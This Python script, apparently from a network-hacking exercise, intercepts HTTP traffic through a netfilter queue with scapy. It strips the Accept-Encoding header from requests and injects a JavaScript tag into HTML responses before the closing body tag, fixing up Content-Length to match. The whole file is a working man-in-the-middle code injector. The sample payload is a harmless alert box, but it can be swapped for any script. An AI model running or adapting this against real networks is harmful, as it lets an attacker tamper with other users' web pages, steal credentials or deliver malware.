#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

# Todo menu for mt pc or other pc forwarding
# TODO run bash to create a iptables queue and use bind to bind them
# TODO flush q after closingf

ip = "10.0.2.5"
ack_list = []


def set_load(packet, payload):
    packet[scapy.Raw].load = payload
    # scapy automatically recalculate fields
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


# TODO keyboard interrupt https and iptables


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        # default port for http
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            # print(scapy_packet.show())
            # trick the server to think we cant use encoding
            load = re.sub(r"Accept-Encoding:.*?\\r\\n", "", str(load))

            # print(modified_load)


        elif scapy_packet[scapy.TCP].sport == 80:
            injection_code = "<script>alert('alert');</script>"
            print("HTTP Response")
            # print(scapy_packet.show())
            load = load.replace("</body>", injection_code + "</body>")
            # not all responses have content length

            content_length = re.search(r"(?:Content-Length:\s)(\d*)", load)
            if content_length and "text/html" in load:
                content_length = content_length.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load=load.replace(content_length,str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))
    # print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()

queue.bind(0, process_packet)
queue.run()
